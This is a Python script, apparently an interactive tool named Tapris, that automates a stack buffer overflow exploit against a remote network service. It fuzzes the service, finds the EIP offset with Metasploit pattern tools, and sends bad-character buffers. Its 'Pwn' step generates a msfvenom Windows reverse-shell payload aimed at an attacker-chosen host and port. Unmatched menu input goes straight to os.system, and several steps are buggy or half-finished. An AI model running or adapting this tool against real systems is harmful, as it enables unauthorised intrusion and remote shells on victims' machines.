#!/bin/python3

import socket
import time
import sys
import os
import readline

def overflow_fuzz():
	ip = str(rhost)
	port = int(rport)
	timeout = 5
	prefix = str(func) + " "
	string = prefix + "A" * 100
	start1 = 0
	while start1 == 0:
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				s.settimeout(timeout)
				s.connect((ip, port))
				s.recv(1024)
				print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
				s.send(bytes(string, "latin-1"))
				s.recv(1024)
		except:
			print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
			fuzz = len(string) - len(prefix)
			with open("fuzz.txt","w") as file:
				file.write(str(fuzz))
			start1 = 1
			
			
		string += 100 * "A"
		time.sleep(1)
def overflow_eip():
	start2 = 0
	while start2 == 0:
		ip = str(rhost)
		port = int(rport)
		prefix = str(func) + " "
		offset = offset_overflow
		overflow = "A" * offset
		retn = ret
		padding = ""
		payloadchar = payload
		postfix = ""

		buffer = prefix + overflow + retn + padding + payloadchar + postfix

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
			s.connect((ip, port))
			print("Sending evil buffer...")
			s.send(bytes(buffer + "\r\n", "latin-1"))
			print("Done!")
			start2 = 1
		except:
			print("Could not connect.")
			start2 = 1
			
def bad_char():
	start2 = 0
	while start2 == 0:
		ip = str(rhost)
		port = int(rport)
		prefix = str(func) + " "
		offset = offset_overflow
		overflow = "A" * offset
		retn = ret
		padding = ""
		payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
		postfix = ""

		buffer = prefix + overflow + retn + padding + payload + postfix

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
			s.connect((ip, port))
			print("Sending evil buffer...")
			s.send(bytes(buffer + "\r\n", "latin-1"))
			print("Done!")
			start2 = 1
		except:
			print("Could not connect.")
			start2 = 1
			
def menu2():
	print("")
	print("------------------------------------------")
	print("\033[1;31;40mRHOST:\033[0m " + rhost)
	print("\033[1;31;40mRPORT:\033[0m " + rport)
	print("\033[1;31;40mOverflow:\033[0m {}".format(fuzz))
	print("")
	print("\033[1;37;40m1.Set or change target IP and port\033[0m")
	print("\033[1;37;40m2.Fuzz Test Function\033[0m")
	print("\033[1;37;40m3.Find the exact address where the program crashes\033[0m")
	print("\033[1;37;40m4.Finding Bad Characters\033[0m")
	print("\033[1;37;40m5.Pwn\033[0m")

def menu1():
	print("")
	print("\033[1;33;40m _____                _      \033[0m")
	print("\033[1;33;40m|_   _|_ _ _ __  _ __(_)___  \033[0m")
	print("\033[1;33;40m  | |/ _` | '_ \| '__| / __| \033[0m")
	print("\033[1;33;40m  | | (_| | |_) | |  | \__ \ \033[0m")
	print("\033[1;33;40m  |_|\__,_| .__/|_|  |_|___/ \033[0m")
	print("\033[1;33;40m          |_|                \033[0m   \033[1;31;40mv1.0\033[0m")

os.system("touch fuzz.txt")
os.system("touch offset.txt")
start = 0
rhost = ""
rport = ""
fuzz = ""
func = ""
num1 = "1"
num2 = "2"
num3 = "3"
num4 = "4"
num5 = "5"
ex = 1
lhost = ""
lport = ""

menu1()
menu2()
while start == 0:
	
	print("")
	num = input("\033[1;31;40mPleas Enter the option >\033[0m ")
	
	if num in (num1,num2,num3,num4,num5):
		if(num == num1):
			rhost = input("\033[1;31;40mSet or change target IP and port@RHOST >\033[0m ")
			rport = input("\033[1;31;40mSet or change target IP and port@PORT >\033[0m ")
			os.system("clear")
			menu1()
			menu2()
		
		elif(num == num2):
			func = input("\033[1;31;40mFuzz Test Function@Please enter the function to test >\033[0m ")
			overflow_fuzz()
			with open("fuzz.txt","r") as file:
				fuzz = file.read()
			menu1()
			menu2()
		elif(num == num3):
			result = os.popen("/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {}".format(fuzz))
			payload = result.read()
			offset_overflow = 0
			ret = ""
			overflow_eip()
		
		elif(num == num4):
			if(ex == 1):
				overflow = input("\033[1;31;40mFinding Bad Characters@Please enter the value of eip >\033[0m ")
				#os.system("/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l {} ".format(fuzz) + "-q {}".format(overflow))
				result2 = os.popen("/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l {} ".format(fuzz) + "-q {}".format(overflow))
				offset_re = result2.read()
				with open("offset.txt","w") as file:
					file.write(offset_re)
				#offset_re2 = os.popen("awk -F ' ' '{print $6}' offset.txt")
				#offset_overflow = input("\033[1;31;40mFinding Bad Characters@Please enter the value >\033[0m ")
				offset_re2 = os.popen("awk -F ' ' '{print $6}' offset.txt")
				offset_re = offset_re2.read()
				with open("offset_overflow.txt","w") as file:
					file.write(offset_re)
				with open("offset_overflow.txt","r") as file:
					pa = file.read()
				offset_overflow = int(pa)
				fuzz = offset_overflow
				ret = "BBBB"
				bad_char()
				menu1()
				menu2()
				ex = ex + 1
			else:
				offset_re2 = os.popen("awk -F ' ' '{print $6}' offset.txt")
				offset_re = offset_re2.read()
				with open("offset_overflow.txt","w") as file:
					file.write(offset_re)
				with open("offset_overflow.txt","r") as file:
					pa = file.read()
				offset_overflow = int(pa)
				fuzz = offset_overflow
				ret = "BBBB"
				bad_char()
				menu1()
				menu2()
		elif(num == num5):
			lhost = input("\033[1;31;40mPlease enter the local IP >\033[0m ")
			lport = input("\033[1;31;40mPlease enter the local listening port >\033[0m ")
			ret = input("\033[1;31;40mPlease enter the jump address >\033[0m ")
			bad_char = input("\033[1;31;40mPlease enter bad characters >\033[0m ")
			payload_msf = os.system("msfvenom -p windows/shell_reverse_tcp LHOST={} ".format(lhost) + "LPORT={} ".format(lport) + "EXITFUNC=thread -b '{}' ".format(bad_char) + "-f c")
			os.system("chmod 777 overfile_pwn.py")
			print("")
			os.system("pwd")
			print("\033[1;37;40mPoc:\033[0m \033[1;31;40moverfile_pwn.py\033[0m")
			print("\033[1;37;40mTarget ip address:\033[0m \033[1;31;40m{}\033[0m".format(rhost))
			print("\033[1;37;40mTarget port :\033[0m \033[1;31;40m{}\033[0m".format(rport))
			print("\033[1;37;40mTested function :\033[0m \033[1;31;40m{}\033[0m".format(func))
			print("\033[1;37;40mOverflow boundary :\033[0m \033[1;31;40m{}\033[0m".format(fuzz))
			print("\033[1;37;40mReturn address :\033[0m \033[1;31;40m{}\033[0m".format(ret))
	else:
		os.system(num)
			
			
			
			
			
			
			
			
			
	
	
	
	
	
	
	
	
	
	
	

